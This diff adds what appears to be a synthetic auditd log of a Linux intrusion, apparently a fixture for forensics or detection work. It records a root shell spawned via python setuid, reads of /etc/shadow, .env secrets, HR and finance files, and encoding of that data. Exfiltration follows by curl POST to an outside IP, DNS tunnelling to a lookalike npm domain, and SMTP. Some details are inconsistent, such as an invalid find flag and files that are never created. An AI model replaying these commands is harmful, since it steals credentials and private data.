@@ -1,0 +1,188 @@
+type=SYSCALL msg=audit(1790068445.000:1): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234ab0001 a1=7f1234ab0002 a2=0 a3=0 items=2 ppid=19233 pid=19235 auid=4294967295 uid=33 gid=33 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="python3" exe="/usr/bin/python3" key="exec"
+type=EXECVE msg=audit(1790068445.000:1): argc=3 a0="python3" a1="-c" a2="import os; os.setuid(0); os.system('/bin/bash -i')"
+type=CWD msg=audit(1790068445.000:1): cwd="/tmp/.s"
+type=PATH msg=audit(1790068445.000:1): item=0 name="/usr/bin/python3" inode=40001 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=NORMAL
+type=SYSCALL msg=audit(1790068450.000:2): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234ab0002 a1=7f1234ab0003 a2=0 a3=0 items=2 ppid=19233 pid=19236 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="id" exe="/usr/bin/id" key="exec"
+type=EXECVE msg=audit(1790068450.000:2): argc=1 a0="id"
+type=CWD msg=audit(1790068450.000:2): cwd="/tmp/.s"
+type=PATH msg=audit(1790068450.000:2): item=0 name="/usr/bin/id" inode=40002 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=NORMAL
+type=SYSCALL msg=audit(1790068451.000:3): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234ab0003 a1=7f1234ab0004 a2=0 a3=0 items=2 ppid=19233 pid=19237 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="whoami" exe="/usr/bin/whoami" key="exec"
+type=EXECVE msg=audit(1790068451.000:3): argc=1 a0="whoami"
+type=CWD msg=audit(1790068451.000:3): cwd="/tmp/.s"
+type=PATH msg=audit(1790068451.000:3): item=0 name="/usr/bin/whoami" inode=40003 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=NORMAL
+type=SYSCALL msg=audit(1790068453.000:4): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234ab0004 a1=7f1234ab0005 a2=0 a3=0 items=2 ppid=19233 pid=19238 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="uname" exe="/usr/bin/uname" key="exec"
+type=EXECVE msg=audit(1790068453.000:4): argc=2 a0="uname" a1="-a"
+type=CWD msg=audit(1790068453.000:4): cwd="/tmp/.s"
+type=PATH msg=audit(1790068453.000:4): item=0 name="/usr/bin/uname" inode=40004 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=NORMAL
+type=SYSCALL msg=audit(1790068455.000:5): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234ab0005 a1=7f1234ab0006 a2=0 a3=0 items=2 ppid=19233 pid=19239 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="hostname" exe="/usr/bin/hostname" key="exec"
+type=EXECVE msg=audit(1790068455.000:5): argc=1 a0="hostname"
+type=CWD msg=audit(1790068455.000:5): cwd="/tmp/.s"
+type=PATH msg=audit(1790068455.000:5): item=0 name="/usr/bin/hostname" inode=40005 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=NORMAL
+type=SYSCALL msg=audit(1790068457.000:6): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234ab0006 a1=7f1234ab0007 a2=0 a3=0 items=2 ppid=19233 pid=19240 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="cat" exe="/usr/bin/cat" key="exec"
+type=EXECVE msg=audit(1790068457.000:6): argc=2 a0="cat" a1="/etc/os-release"
+type=CWD msg=audit(1790068457.000:6): cwd="/tmp/.s"
+type=PATH msg=audit(1790068457.000:6): item=0 name="/usr/bin/cat" inode=40006 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=NORMAL
+type=SYSCALL msg=audit(1790068625.000:7): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234ab0007 a1=7f1234ab0008 a2=0 a3=0 items=2 ppid=19233 pid=19241 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="ip" exe="/usr/sbin/ip" key="exec"
+type=EXECVE msg=audit(1790068625.000:7): argc=3 a0="ip" a1="addr" a2="show"
+type=CWD msg=audit(1790068625.000:7): cwd="/tmp/.s"
+type=PATH msg=audit(1790068625.000:7): item=0 name="/usr/sbin/ip" inode=40007 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=NORMAL
+type=SYSCALL msg=audit(1790068628.000:8): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234ab0008 a1=7f1234ab0009 a2=0 a3=0 items=2 ppid=19233 pid=19242 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="ip" exe="/usr/sbin/ip" key="exec"
+type=EXECVE msg=audit(1790068628.000:8): argc=2 a0="ip" a1="route"
+type=CWD msg=audit(1790068628.000:8): cwd="/tmp/.s"
+type=PATH msg=audit(1790068628.000:8): item=0 name="/usr/sbin/ip" inode=40008 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=NORMAL
+type=SYSCALL msg=audit(1790068632.000:9): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234ab0009 a1=7f1234ab000a a2=0 a3=0 items=2 ppid=19233 pid=19243 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="ss" exe="/usr/sbin/ss" key="exec"
+type=EXECVE msg=audit(1790068632.000:9): argc=2 a0="ss" a1="-tlnp"
+type=CWD msg=audit(1790068632.000:9): cwd="/tmp/.s"
+type=PATH msg=audit(1790068632.000:9): item=0 name="/usr/sbin/ss" inode=40009 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=NORMAL
+type=SYSCALL msg=audit(1790068638.000:10): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234ab000a a1=7f1234ab000b a2=0 a3=0 items=2 ppid=19233 pid=19244 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="ps" exe="/usr/bin/ps" key="exec"
+type=EXECVE msg=audit(1790068638.000:10): argc=3 a0="ps" a1="aux" a2="--forest"
+type=CWD msg=audit(1790068638.000:10): cwd="/tmp/.s"
+type=PATH msg=audit(1790068638.000:10): item=0 name="/usr/bin/ps" inode=40010 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=NORMAL
+type=SYSCALL msg=audit(1790068645.000:11): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234ab000b a1=7f1234ab000c a2=0 a3=0 items=2 ppid=19233 pid=19245 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="cat" exe="/usr/bin/cat" key="exec"
+type=EXECVE msg=audit(1790068645.000:11): argc=2 a0="cat" a1="/etc/passwd"
+type=CWD msg=audit(1790068645.000:11): cwd="/tmp/.s"
+type=PATH msg=audit(1790068645.000:11): item=0 name="/usr/bin/cat" inode=40011 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=NORMAL
+type=SYSCALL msg=audit(1790068925.000:12): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234ab000c a1=7f1234ab000d a2=0 a3=0 items=2 ppid=19233 pid=19246 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="find" exe="/usr/bin/find" key="exec"
+type=EXECVE msg=audit(1790068925.000:12): argc=5 a0="find" a1="/" a2="--name" a3="*.env" a4="-readable"
+type=CWD msg=audit(1790068925.000:12): cwd="/tmp/.s"
+type=PATH msg=audit(1790068925.000:12): item=0 name="/usr/bin/find" inode=40012 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=NORMAL
+type=SYSCALL msg=audit(1790068938.000:13): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234ab000d a1=7f1234ab000e a2=0 a3=0 items=2 ppid=19233 pid=19247 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="ls" exe="/usr/bin/ls" key="exec"
+type=EXECVE msg=audit(1790068938.000:13): argc=3 a0="ls" a1="-la" a2="/opt/"
+type=CWD msg=audit(1790068938.000:13): cwd="/tmp/.s"
+type=PATH msg=audit(1790068938.000:13): item=0 name="/usr/bin/ls" inode=40013 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=NORMAL
+type=SYSCALL msg=audit(1790068948.000:14): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234ab000e a1=7f1234ab000f a2=0 a3=0 items=2 ppid=19233 pid=19248 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="ls" exe="/usr/bin/ls" key="exec"
+type=EXECVE msg=audit(1790068948.000:14): argc=3 a0="ls" a1="-la" a2="/opt/app/config/"
+type=CWD msg=audit(1790068948.000:14): cwd="/tmp/.s"
+type=PATH msg=audit(1790068948.000:14): item=0 name="/usr/bin/ls" inode=40014 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=NORMAL
+type=SYSCALL msg=audit(1790069225.000:15): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234ab000f a1=7f1234ab0010 a2=0 a3=0 items=2 ppid=19233 pid=19249 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="cat" exe="/usr/bin/cat" key="exec"
+type=EXECVE msg=audit(1790069225.000:15): argc=2 a0="cat" a1="/opt/app/config/production.env"
+type=CWD msg=audit(1790069225.000:15): cwd="/tmp/.s"
+type=PATH msg=audit(1790069225.000:15): item=0 name="/usr/bin/cat" inode=40015 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=NORMAL
+type=SYSCALL msg=audit(1790069232.000:16): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234ab0010 a1=7f1234ab0011 a2=0 a3=0 items=2 ppid=19233 pid=19250 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="cat" exe="/usr/bin/cat" key="exec"
+type=EXECVE msg=audit(1790069232.000:16): argc=2 a0="cat" a1="/opt/hr/employee_records.csv"
+type=CWD msg=audit(1790069232.000:16): cwd="/tmp/.s"
+type=PATH msg=audit(1790069232.000:16): item=0 name="/usr/bin/cat" inode=40016 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=NORMAL
+type=SYSCALL msg=audit(1790069240.000:17): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234ab0011 a1=7f1234ab0012 a2=0 a3=0 items=2 ppid=19233 pid=19251 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="cat" exe="/usr/bin/cat" key="exec"
+type=EXECVE msg=audit(1790069240.000:17): argc=2 a0="cat" a1="/var/backups/data.dump"
+type=CWD msg=audit(1790069240.000:17): cwd="/tmp/.s"
+type=PATH msg=audit(1790069240.000:17): item=0 name="/usr/bin/cat" inode=40017 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=NORMAL
+type=SYSCALL msg=audit(1790069248.000:18): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234ab0012 a1=7f1234ab0013 a2=0 a3=0 items=2 ppid=19233 pid=19252 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="cat" exe="/usr/bin/cat" key="exec"
+type=EXECVE msg=audit(1790069248.000:18): argc=2 a0="cat" a1="/srv/app/releases/release-notes.txt"
+type=CWD msg=audit(1790069248.000:18): cwd="/tmp/.s"
+type=PATH msg=audit(1790069248.000:18): item=0 name="/usr/bin/cat" inode=40018 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=NORMAL
+type=SYSCALL msg=audit(1790069255.000:19): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234ab0013 a1=7f1234ab0014 a2=0 a3=0 items=2 ppid=19233 pid=19253 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="ls" exe="/usr/bin/ls" key="exec"
+type=EXECVE msg=audit(1790069255.000:19): argc=2 a0="ls" a1="/opt/finance/"
+type=CWD msg=audit(1790069255.000:19): cwd="/tmp/.s"
+type=PATH msg=audit(1790069255.000:19): item=0 name="/usr/bin/ls" inode=40019 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=NORMAL
+type=SYSCALL msg=audit(1790069262.000:20): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234ab0014 a1=7f1234ab0015 a2=0 a3=0 items=2 ppid=19233 pid=19254 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="cat" exe="/usr/bin/cat" key="exec"
+type=EXECVE msg=audit(1790069262.000:20): argc=2 a0="cat" a1="/etc/shadow"
+type=CWD msg=audit(1790069262.000:20): cwd="/tmp/.s"
+type=PATH msg=audit(1790069262.000:20): item=0 name="/usr/bin/cat" inode=40020 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=NORMAL
+type=SYSCALL msg=audit(1790069525.000:21): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234ab0015 a1=7f1234ab0016 a2=0 a3=0 items=2 ppid=19233 pid=19255 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="mkdir" exe="/usr/bin/mkdir" key="exec"
+type=EXECVE msg=audit(1790069525.000:21): argc=3 a0="mkdir" a1="-p" a2="/tmp/.s"
+type=CWD msg=audit(1790069525.000:21): cwd="/tmp/.s"
+type=PATH msg=audit(1790069525.000:21): item=0 name="/usr/bin/mkdir" inode=40021 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=NORMAL
+type=SYSCALL msg=audit(1790069528.000:22): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234ab0016 a1=7f1234ab0017 a2=0 a3=0 items=2 ppid=19233 pid=19256 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="chmod" exe="/usr/bin/chmod" key="exec"
+type=EXECVE msg=audit(1790069528.000:22): argc=3 a0="chmod" a1="700" a2="/tmp/.s"
+type=CWD msg=audit(1790069528.000:22): cwd="/tmp/.s"
+type=PATH msg=audit(1790069528.000:22): item=0 name="/usr/bin/chmod" inode=40022 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=NORMAL
+type=SYSCALL msg=audit(1790069533.000:23): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234ab0017 a1=7f1234ab0018 a2=0 a3=0 items=2 ppid=19233 pid=19257 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="printf" exe="/usr/bin/printf" key="exec"
+type=EXECVE msg=audit(1790069533.000:23): argc=2 a0="printf" a1="bWFuZ28tNDc="
+type=CWD msg=audit(1790069533.000:23): cwd="/tmp/.s"
+type=PATH msg=audit(1790069533.000:23): item=0 name="/usr/bin/printf" inode=40023 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=NORMAL
+type=SYSCALL msg=audit(1790069534.000:24): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234ab0018 a1=7f1234ab0019 a2=0 a3=0 items=2 ppid=19233 pid=19258 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="base64" exe="/usr/bin/base64" key="exec"
+type=EXECVE msg=audit(1790069534.000:24): argc=2 a0="base64" a1="-d"
+type=CWD msg=audit(1790069534.000:24): cwd="/tmp/.s"
+type=PATH msg=audit(1790069534.000:24): item=0 name="/usr/bin/base64" inode=40024 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=NORMAL
+type=SYSCALL msg=audit(1790069540.000:25): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234ab0019 a1=7f1234ab001a a2=0 a3=0 items=2 ppid=19233 pid=19259 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="printf" exe="/usr/bin/printf" key="exec"
+type=EXECVE msg=audit(1790069540.000:25): argc=2 a0="printf" a1="cmF2ZW4tMTk="
+type=CWD msg=audit(1790069540.000:25): cwd="/tmp/.s"
+type=PATH msg=audit(1790069540.000:25): item=0 name="/usr/bin/printf" inode=40025 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=NORMAL
+type=SYSCALL msg=audit(1790069541.000:26): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234ab001a a1=7f1234ab001b a2=0 a3=0 items=2 ppid=19233 pid=19260 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="base64" exe="/usr/bin/base64" key="exec"
+type=EXECVE msg=audit(1790069541.000:26): argc=2 a0="base64" a1="-d"
+type=CWD msg=audit(1790069541.000:26): cwd="/tmp/.s"
+type=PATH msg=audit(1790069541.000:26): item=0 name="/usr/bin/base64" inode=40026 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=NORMAL
+type=SYSCALL msg=audit(1790069548.000:27): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234ab001b a1=7f1234ab001c a2=0 a3=0 items=2 ppid=19233 pid=19261 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="printf" exe="/usr/bin/printf" key="exec"
+type=EXECVE msg=audit(1790069548.000:27): argc=2 a0="printf" a1="U3Rvcm0tV2luZC0yMDI2"
+type=CWD msg=audit(1790069548.000:27): cwd="/tmp/.s"
+type=PATH msg=audit(1790069548.000:27): item=0 name="/usr/bin/printf" inode=40027 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=NORMAL
+type=SYSCALL msg=audit(1790069549.000:28): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234ab001c a1=7f1234ab001d a2=0 a3=0 items=2 ppid=19233 pid=19262 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="base64" exe="/usr/bin/base64" key="exec"
+type=EXECVE msg=audit(1790069549.000:28): argc=2 a0="base64" a1="-d"
+type=CWD msg=audit(1790069549.000:28): cwd="/tmp/.s"
+type=PATH msg=audit(1790069549.000:28): item=0 name="/usr/bin/base64" inode=40028 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=NORMAL
+type=SYSCALL msg=audit(1790069552.000:29): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234ab001d a1=7f1234ab001e a2=0 a3=0 items=2 ppid=19233 pid=19263 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="python3" exe="/usr/bin/python3" key="exec"
+type=EXECVE msg=audit(1790069552.000:29): argc=6 a0="python3" a1="/tmp/.s/stage.py" a2="xor" a3="$KEY1" a4="/opt/app/config/production.env" a5="/tmp/.s/p1.dat"
+type=CWD msg=audit(1790069552.000:29): cwd="/tmp/.s"
+type=PATH msg=audit(1790069552.000:29): item=0 name="/usr/bin/python3" inode=40029 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=NORMAL
+type=SYSCALL msg=audit(1790069578.000:30): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234ab001e a1=7f1234ab001f a2=0 a3=0 items=2 ppid=19233 pid=19264 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="base32" exe="/usr/bin/base32" key="exec"
+type=EXECVE msg=audit(1790069578.000:30): argc=1 a0="base32"
+type=CWD msg=audit(1790069578.000:30): cwd="/tmp/.s"
+type=PATH msg=audit(1790069578.000:30): item=0 name="/usr/bin/base32" inode=40030 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=NORMAL
+type=SYSCALL msg=audit(1790069582.000:31): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234ab001f a1=7f1234ab0020 a2=0 a3=0 items=2 ppid=19233 pid=19265 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="fold" exe="/usr/bin/fold" key="exec"
+type=EXECVE msg=audit(1790069582.000:31): argc=3 a0="fold" a1="-w" a2="30"
+type=CWD msg=audit(1790069582.000:31): cwd="/tmp/.s"
+type=PATH msg=audit(1790069582.000:31): item=0 name="/usr/bin/fold" inode=40031 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=NORMAL
+type=SYSCALL msg=audit(1790069598.000:32): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234ab0020 a1=7f1234ab0021 a2=0 a3=0 items=2 ppid=19233 pid=19266 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="python3" exe="/usr/bin/python3" key="exec"
+type=EXECVE msg=audit(1790069598.000:32): argc=5 a0="python3" a1="/tmp/.s/gen_qr.py" a2="/tmp/.s/p3_src.dat" a3="3" a4="/tmp/.s/"
+type=CWD msg=audit(1790069598.000:32): cwd="/tmp/.s"
+type=PATH msg=audit(1790069598.000:32): item=0 name="/usr/bin/python3" inode=40032 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=NORMAL
+type=SYSCALL msg=audit(1790069625.000:33): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234ab0021 a1=7f1234ab0022 a2=0 a3=0 items=2 ppid=19233 pid=19267 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="python3" exe="/usr/bin/python3" key="exec"
+type=EXECVE msg=audit(1790069625.000:33): argc=6 a0="python3" a1="/tmp/.s/stage.py" a2="xor_hex" a3="$KEY4" a4="/var/backups/data.dump" a5="/tmp/.s/p4.dat"
+type=CWD msg=audit(1790069625.000:33): cwd="/tmp/.s"
+type=PATH msg=audit(1790069625.000:33): item=0 name="/usr/bin/python3" inode=40033 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=NORMAL
+type=SYSCALL msg=audit(1790069688.000:34): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234ab0022 a1=7f1234ab0023 a2=0 a3=0 items=2 ppid=19233 pid=19268 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="7z" exe="/usr/bin/7z" key="exec"
+type=EXECVE msg=audit(1790069688.000:34): argc=5 a0="7z" a1="a" a2="-tgzip" a3="/tmp/.s/p5_raw.gz" a4="/opt/finance/q3_forecast.xlsx"
+type=CWD msg=audit(1790069688.000:34): cwd="/tmp/.s"
+type=PATH msg=audit(1790069688.000:34): item=0 name="/usr/bin/7z" inode=40034 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=NORMAL
+type=SYSCALL msg=audit(1790069702.000:35): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234ab0023 a1=7f1234ab0024 a2=0 a3=0 items=2 ppid=19233 pid=19269 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="base64" exe="/usr/bin/base64" key="exec"
+type=EXECVE msg=audit(1790069702.000:35): argc=2 a0="base64" a1="/tmp/.s/p5_raw.gz"
+type=CWD msg=audit(1790069702.000:35): cwd="/tmp/.s"
+type=PATH msg=audit(1790069702.000:35): item=0 name="/usr/bin/base64" inode=40035 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=NORMAL
+type=SYSCALL msg=audit(1790069732.000:36): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234ab0024 a1=7f1234ab0025 a2=0 a3=0 items=2 ppid=19233 pid=19270 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="openssl" exe="/usr/bin/openssl" key="exec"
+type=EXECVE msg=audit(1790069732.000:36): argc=12 a0="openssl" a1="enc" a2="-aes-256-cbc" a3="-salt" a4="-md" a5="sha256" a6="-pass" a7="pass:${KEY6}" a8="-in" a9="/srv/app/releases/release-notes.txt" a10="-out" a11="/tmp/.s/r.enc"
+type=CWD msg=audit(1790069732.000:36): cwd="/tmp/.s"
+type=PATH msg=audit(1790069732.000:36): item=0 name="/usr/bin/openssl" inode=40036 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=NORMAL
+type=SYSCALL msg=audit(1790069742.000:37): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234ab0025 a1=7f1234ab0026 a2=0 a3=0 items=2 ppid=19233 pid=19271 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="base64" exe="/usr/bin/base64" key="exec"
+type=EXECVE msg=audit(1790069742.000:37): argc=2 a0="base64" a1="/tmp/.s/r.enc"
+type=CWD msg=audit(1790069742.000:37): cwd="/tmp/.s"
+type=PATH msg=audit(1790069742.000:37): item=0 name="/usr/bin/base64" inode=40037 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=NORMAL
+type=SYSCALL msg=audit(1790070015.000:38): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234ab0026 a1=7f1234ab0027 a2=0 a3=0 items=2 ppid=19233 pid=19272 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="curl" exe="/usr/bin/curl" key="exec"
+type=EXECVE msg=audit(1790070015.000:38): argc=9 a0="curl" a1="-s" a2="-X" a3="POST" a4="--data-binary" a5="@/tmp/.s/p1.dat" a6="-H" a7="Content-Type: application/x-www-form-urlencoded" a8="http://198.244.146.163/api/update"
+type=CWD msg=audit(1790070015.000:38): cwd="/tmp/.s"
+type=PATH msg=audit(1790070015.000:38): item=0 name="/usr/bin/curl" inode=40038 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=NORMAL
+type=SYSCALL msg=audit(1790070068.000:39): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234ab0027 a1=7f1234ab0028 a2=0 a3=0 items=2 ppid=19233 pid=19273 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="python3" exe="/usr/bin/python3" key="exec"
+type=EXECVE msg=audit(1790070068.000:39): argc=6 a0="python3" a1="/tmp/.s/exfil.py" a2="dns" a3="/tmp/.s/p2.dat" a4="66.132.172.130" a5="npmjs-registry.net"
+type=CWD msg=audit(1790070068.000:39): cwd="/tmp/.s"
+type=PATH msg=audit(1790070068.000:39): item=0 name="/usr/bin/python3" inode=40039 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=NORMAL
+type=SYSCALL msg=audit(1790070138.000:40): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234ab0028 a1=7f1234ab0029 a2=0 a3=0 items=2 ppid=19233 pid=19274 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="python3" exe="/usr/bin/python3" key="exec"
+type=EXECVE msg=audit(1790070138.000:40): argc=8 a0="python3" a1="/tmp/.s/exfil.py" a2="smtp" a3="/tmp/.s/q1.png" a4="/tmp/.s/q2.png" a5="/tmp/.s/q3.png" a6="20.122.142.214" a7="finance.archive@external.example"
+type=CWD msg=audit(1790070138.000:40): cwd="/tmp/.s"
+type=PATH msg=audit(1790070138.000:40): item=0 name="/usr/bin/python3" inode=40040 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=NORMAL
